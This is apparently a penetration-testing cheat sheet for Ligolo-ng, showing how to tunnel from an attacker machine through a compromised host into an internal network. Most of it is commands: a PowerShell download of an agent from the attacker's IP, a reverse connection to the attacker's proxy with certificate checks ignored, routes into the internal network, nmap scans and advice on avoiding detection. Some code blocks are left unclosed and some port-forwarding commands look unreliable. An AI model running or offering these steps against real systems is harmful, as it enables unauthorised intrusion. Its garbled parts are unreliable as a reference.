# Ligolo-ng

**GitHub:** [Ligolo-ng GitHub Repository.](https://github.com/nicocha30/ligolo-ng)  

Ligolo-ng is a powerful, lightweight VPN solution used for tunneling and pivoting within a compromised network. It creates a secure reverse tunnel between an agent (on the target) and a proxy server (on the attacker machine). It allows attackers to route traffic through the target machine, providing access to internal networks behind a firewall.

---
## 📦 Installation

### Install on Kali Linux

#### • Install Ligolo-ng using apt:
```powershell
apt install ligolo-ng
```

### Verify Installation

#### • Confirm installation and check version:
```powershell
ligolo-proxy --version
```

---

## 🌐 Network Setup

| Role     | IP Address     | Description                                           |
|----------|----------------|-------------------------------------------------------|
| Attacker | 192.168.1.7    | Kali Linux box running Ligolo-ng proxy server        |
| Target   | 192.168.1.71   | Windows/Linux machine running Ligolo-ng agent        |
| Internal Network | 192.168.2.0/24 | Internal network behind the target       |

---

## 🖥️ Attacker Box Setup (192.168.1.7)

### Check Network Configuration

#### • Check current network interfaces:
```powershell
ifconfig
```
#### • Display all network interfaces:
```powershell
ifconfig -a
```
#### • Check IP routing table:
```powershell
ip route
```

### Create Ligolo Tunnel Interface

#### • Create the Ligolo tunnel interface on the attacker machine:
```powershell
ip tuntap add user root mode tun ligolo
```
#### • Confirm the interface is created:
```powershell
ifconfig
```
#### • Activate the tunnel interface:
```powershell
ip link set ligolo up
```
#### • Confirm the interface is active:
```powershell
ip link show ligolo
```

### Start Local Proxy Server
#### • Start the Ligolo-ng proxy using a self-signed certificate:
```powershell
ligolo-proxy -selfcert -laddr 0.0.0.0:443
```

#### • Alternatively, you can use:
```powershell
./proxy -selfcert -laddr 0.0.0.0:443
```
#### • Verify that the proxy is listening on the specified port:
```powershell
netstat -nltup | grep 443
```
---

## 🧭 Target Box Setup (192.168.1.71)

### Download and Execute Agent
#### • Download the Ligolo-ng agent on the target machine:
```powershell
powershell Invoke-WebRequest "http://192.168.1.7/ligolo-ng/agent.exe" -OutFile "C:\Users\Public\agent.exe"
```
### Run Agent
#### • Execute the Ligolo-ng agent:
```powershell
agent.exe
```
#### • Connect to the proxy server from the agent:
```powershell
./agent -connect 192.168.1.7:443 -ignore-cert
```

- `192.168.1.7` – Attacker's IP
- `443` – Listening port
- `-ignore-cert` – Ignore SSL validation

---

## 🕹️ Manage Sessions on Attacker Box

### Open Session
#### • Start a Ligolo-ng session:
```powershell
ligolo-ng >> session
```

### Check Network and Routing
#### • Check network interfaces:
```powershell
ifconfig
```
#### • Check open ports:
```powershell
netstat -nltup
```
#### • Check IP routes:
```powershell
ip route
```
#### • List routing table:
```powershell
route -n
```

### Add Internal Network Routing
#### • Route traffic from the attacker to the target's internal network:
```powershell
ip route add 192.168.2.0/24 dev ligolo
```

- `192.168.2.0/24` – Internal network
- `ligolo` – Tunnel interface

---

## 🔄 Manage Tunnel

```powershell
[Agent: root@webserver] >> start

```powershell
[Agent: root@webserver] » tunnel_list

```powershell
nmap -v -p- -sT 192.168.2.10
```

---

## 🌀 Access to Agent's Local Ports (127.0.0.1)

Ligolo-ng uses a special CIDR range `240.0.0.0/4` to redirect traffic to the agent's local IP.

### Example

```bash
ip route add 240.0.0.1/32 dev ligolo
nmap -v -p- -sT 240.0.0.1
```

Access via browser:

```
http://240.0.0.1
```

---

## 🛠️ Troubleshooting

### Check Proxy Server Logs

```bash
cat /var/log/ligolo-ng.log
```

### Restart Proxy

```bash
killall ligolo-proxy
ligolo-proxy -selfcert -laddr 0.0.0.0:443
```

### Reset Tunnel Interface

```bash
ip link delete ligolo
```

---

## 🧹 Clean Up

### Delete Tunnel Interface

```bash
ip link delete ligolo
```

### Kill Running Proxy

```bash
killall ligolo-proxy
```

---

## 🔁 Pivoting and Port Forwarding

### Local Port Forwarding

```bash
ligolo-ng » tunnel add -local 8080 -remote 8080
```

### Remote Port Forwarding

```bash
ligolo-ng » tunnel add -local 8080 -remote 192.168.1.7:8080
```

---

## 🔗 Establish Proxy Chains

1. Create the first tunnel:

```bash
ligolo-ng » tunnel add -local 1080 -remote 10.0.0.1:1080
```

2. Use `proxychains`:

```bash
proxychains firefox http://10.0.0.1
```

> Ensure `proxychains.conf` is set to use `localhost:1080`.

---

## ✅ Best Practices

- Use Ligolo-ng over HTTPS (port 443) to reduce detection risk.
- Regularly rotate SSL certificates.
- Use `proxychains` for dynamic forwarding and routing.
- Secure and rotate logs frequently.

---

**🚨 Use responsibly in authorized environments only.**
